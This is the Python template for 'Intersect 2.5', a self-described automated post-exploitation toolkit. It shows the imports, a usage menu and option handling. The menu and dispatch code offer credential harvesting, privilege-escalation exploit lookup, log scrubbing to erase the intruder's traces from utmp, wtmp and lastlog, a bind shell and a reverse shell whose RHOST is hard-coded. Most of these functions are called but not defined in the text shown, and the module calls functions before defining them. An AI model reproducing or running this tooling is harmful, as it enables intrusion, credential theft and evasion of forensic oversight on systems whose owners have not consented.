#!/usr/bin/python

# Intersect 2.5
# Template for Create.py
# Includes any nessicary libraries, usage, etc
# Create.py will let the user select which functions they wish to include (stored as separate files)
# then make a new copy of template.py, insert the selected functions and save

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import shutil
import getopt
import tarfile
import socket
import urllib2
import string
import random, string
import logging
import struct
import getpass
import pwd


cut = lambda s: str(s).split("\0",1)[0]

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    print "Python module Scapy not installed. You must have this to use the --live-hosts option."

environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])

def usage():
    
   __version__ = "customized with create.py"
   __author__ = "ohdae"
   __website__ = "http://bindshell.it.cx"
   
   print("=====================================================")                                                                    
   print("       intersect 2.5 | automated post-exploitation")
   print("                "+__version__+"                ")
   print("               "+__author__+" | "+__website__)
   print("=====================================================")
   print("\nFeatures:")
   print("  -d --daemon         run Intersect as a background process")
   print("  -o --os-info        os/distro, users, devices, cronjobs, installed apps, etc")
   print("  -n --network        detailed network info")
   print("  -l --live-hosts     find live hosts on network")
   print("  -c --credentials    locate and save user/system credentials")
   print("  -e --extras         locate installed AV/FW, configs and extras")
   print("  -a --all-tests      run all local tests and tar reports *scapy required")
   print("  -t --tar            make archive of final reports")
   print("  -s --scrub          scrubs current user/ip from utmp, wtmp & lastlog")
   print("  -b --bind           opens bindshell on port 443")
   print("  -r --reverse        opens reverse shell *change RHOST in config")  
   print("  -h --help           prints this menu")
   print("usage: ./intersect.py --daemon --network --extras")
   print("       ./intersect.py --all-tests\n")

def environment():
   global Home_Dir
   global Temp_Dir
   global kernel
   global distro
   global User_Ip_Address
   global UTMP_STRUCT_SIZE    
   global LASTLOG_STRUCT_SIZE
   global UTMP_FILEPATH      
   global WTMP_FILEPATH       
   global LASTLOG_FILEPATH
   global Config_Dir
   global RHOST

   # Change RHOST accordingly if you're going to use the reverse shell   
   RHOST = '192.168.1.19'

   fullkernel = os.uname()[2]
   splitkern = fullkernel.split("-")
   kernel = splitkern[0]
   distro = os.uname()[1]
   arch = os.uname()[4]
 
   if os.geteuid() != 0:
        print("[*] This script *must* be executed as root. If not, there will be errors and/or crashes.")
        print("[*] Intersect will now check this kernel for possible privilege escalation exploits.\n     We will find your kernel version and display a list of exploits for that kernel, if available.")
        exploitCheck()
        print("[+] The exploits above *might* allow you to gain root access.")
        print("[+] Intersect cannot be executed as a non-root user. Please run again while root.")
        sys.exit()
   else:
        pass

   Home_Dir = os.environ['HOME']
   User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
   Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
   Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
   Config_Dir = Temp_Dir+"/configs/"
   

   signal.signal(signal.SIGINT, signalHandler)
    
   # Tested on Linux ubuntu 3.0.0-12-generic #20-Ubuntu
   UTMP_STRUCT_SIZE    = 384
   LASTLOG_STRUCT_SIZE = 292
   UTMP_FILEPATH       = "/var/run/utmp"
   WTMP_FILEPATH       = "/var/log/wtmp"
   LASTLOG_FILEPATH    = "/var/log/lastlog"
   
   os.system("clear")

   print("[+] Creating temporary working environment....")
   os.chdir(Home_Dir)
   if os.path.exists(Temp_Dir) is True:
       os.system("rm -rf "+Temp_Dir)
   if os.path.exists(Temp_Dir) is False:
       os.mkdir(Temp_Dir)

   print "[!] Reports will be saved in: %s" % Temp_Dir

  
def signalHandler(signal, frame):
  print("[!] Ctrl-C caught, shutting down now");
  Shutdown()

  
def Shutdown():
  if not os.listdir(Temp_Dir):
    os.rmdir(Temp_Dir)

def main(argv):
    try:
        opts, args = getopt.getopt(argv, "dhtonlcesbra", ["daemon", "help", "tar", "os-info", "network", "live hosts", "credentials", "extras", "scrub", "bind", "reverse", "all-tests"])
    except getopt.GetoptError, err:
        print str(err) 
        usage()
        Shutdown()
    for o, a in opts:
        if o in ("-d", "--daemon"):
            daemon()
        elif o in ("-h", "--help"):
            usage()
	    Shutdown()
	    sys.exit(2)	
        elif o in ("-t", "--tar"):
            MakeArchive()
        elif o in ("-o", "--os-info"):
            Gather_OS()
        elif o in ("-n", "--network"):
             NetworkInfo()
        elif o in ("-l", "--live-hosts"):
             NetworkMap()
        elif o in ("-c", "--credentials"):
             GetCredentials() 
        elif o in ("-e", "--extras"): 
             FindExtras()
        elif o in ("-s", "--scrub"):
	     ScrubLog()
        elif o in ("-b", "--bind"):
             bindShell()
        elif o in ("-r", "--reverse"):
             reverseShell()
        elif o in ("-a", "--all-tests"):
             Gather_OS()
             NetworkInfo()
             NetworkMap()
             GetCredentials()
             FindExtras()
             MakeArchive()
        else:
            assert False, "unhandled option"
    Shutdown()



